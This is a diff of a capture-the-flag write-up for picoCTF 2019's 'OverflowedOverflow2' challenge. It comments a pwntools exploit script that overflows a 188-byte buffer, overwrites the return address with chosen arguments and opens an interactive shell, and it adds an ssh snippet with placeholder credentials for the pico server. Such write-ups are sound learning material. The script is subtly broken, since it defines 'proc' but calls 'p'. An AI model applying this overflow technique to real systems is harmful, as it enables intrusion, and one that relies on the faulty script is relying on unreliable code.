@@ -84,7 +84,7 @@ Use the cyclic tool to get a string to give the program: `cyclic 200`.
 
 Run GDB for the program.
 Feed the string to the input and then analyze.
-a
+
 <!-- OverflowedOverflow2 -->
 ![Image of overflowed](../Images/PicoCTF2019/OverflowedOverflow2.jpg)
 
@@ -117,7 +117,7 @@ Final script:
 ```python
 from pwn import *
 
-proc = process('./vuln')
+proc = process('./vuln') # specifying the process
 
 # addr and arg variables
 addr = 0x80485e6
@@ -127,13 +127,22 @@ arg1 = 0xC0DED00D
 # create payload of 188 + return address + 4 bytes + arg1 + arg2
 payload = b'A'*188 + p32(addr) + b'A'*4 + p32(arg0) + p32(arg1)
 
+# keep receiving until character is read
 p.recvuntil(b'Please enter your string:')
 
+# send payload as one line
 p.sendline(payload)
 
+# to get a shell
 p.interactive()
+```
+
+To run it through the pico2019 server you'll need the `ssh` feature:
+```python
+s = ssh(host='2019shell1.picoctf.com', user='YourUsername', password='YourPassword')
+p = s.process('AbsolutePathToProgram', cwd='TheWorkingDirectoryOfProgram')
 ```
 
 Run the script and you should win.
 
-[Overflow 1](overflow1writeup.md)
+[Overflow 1](overflow1writeup.md)   [New Overflow 1](newoverflow1writeup.md)
